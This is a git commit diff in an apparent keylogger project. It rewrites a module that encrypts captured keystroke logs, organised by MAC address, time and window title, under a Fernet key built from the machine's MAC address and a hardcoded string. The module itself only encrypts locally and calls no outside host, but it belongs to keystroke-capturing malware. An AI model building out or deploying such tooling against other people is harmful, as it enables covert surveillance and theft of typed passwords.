39b14c3236b5000155f464825773ccf2f3aed95a
Moshe Shulman <33040420+Msh36345@users.noreply.github.com>
2025-02-13 14:04:14 +0200

    Update encrypt_file.py

--- Encrypt_Decrypt/encrypt_file.py
+++ Encrypt_Decrypt/encrypt_file.py
@@ -1,26 +1,33 @@
+import json
+import base64
 from cryptography.fernet import Fernet
 from getmac import get_mac_address
-import json
 
-class Encrypt:
-    def __init__(self):
-        self._key = Fernet.generate_key()
+#exsemple
+exsemple_dic={"f8:54:f6:bc:2e:64": {"12/02/2025  16:04": {"Desktop – KeyLogger_Manager.py": ["k", "j", "k", "j", "k", "j", "d", "k", "w", "j", "k", "j", "k"], "כרטיסייה חדשה - Google Chrome": ["h", "k", "h", "k", "d", "j", "k", "j", "k", "j", "d", "s", "j", "k", "j", "k", "s"], "Program Manager": ["shift", "Q"]}}}
 
-    def encrypt_data(self, data, output_file="keylog.enc"):
-        fernet = Fernet(self._key)
-        encrypted_data = fernet.encrypt(json.dumps(data).encode())
-        return encrypted_data
 
-    def decrypt_data(self, encrypted_data):
-        fernet = Fernet(self._key)
-        decrypted_data = fernet.decrypt(encrypted_data)
-        return json.loads(decrypted_data)
+#create a key base on the mac address
+def create_key():
+    # for test option
+    ad="f8:54:f6:bc:2e:64"
+    address=ad.replace(":","f")
 
-# print(len(Encrypt()._key))
-# print(Encrypt().encrypt_data({1:2,3:4}))
-# print(len(Encrypt()._key))
-# e=Encrypt().encrypt_data({1:2,3:4})
-# print(bytes(e))
-# print(Encrypt().decrypt_data(bytes(e)))
+    # address = get_mac_address().replace(":","f") #get mac address and replace ":" white "f"
+    base_key = f"fp88{address}wAxDAAjijM=" #our key
+    final_key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64
+    return final_key
 
-print({1:{2:{3:9}}})
+
+def encrypt_data(dic_data):
+    fernet = Fernet(key)
+    encrypted_data = fernet.encrypt(json.dumps(dic_data).encode())
+    return encrypted_data
+
+# Example
+key=create_key()
+encrypted_dic=encrypt_data(exsemple_dic)
+
+if __name__ == "__main__":
+    print("🔑 key:",key)
+    print("🔒 encrypted data:",encrypted_dic)
